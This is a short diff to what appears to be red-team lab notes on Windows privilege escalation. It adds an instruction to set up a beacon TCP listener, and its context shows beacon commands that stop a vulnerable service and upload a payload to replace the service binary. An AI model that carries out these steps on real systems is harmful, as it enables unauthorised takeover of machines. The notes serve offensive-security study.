@@ -107,6 +107,9 @@ Sddl   : O:BAG:S-1-5-21-689523297-2952850621-452819511-513D:PAI(A;;FA;;;SY)(A;;F
 ```
 
 This allows us to simply overwrite the binary with something else (make sure you take a backup first).
+
+Add a new listener and select beacon TCP before you create your payload. (I didnt check the bind to localhost checkbox, i am not sure when you would use this).
+
 ```
 beacon> run sc stop Vuln-Service-3
 beacon> upload C:\Payloads\Service 3.exe
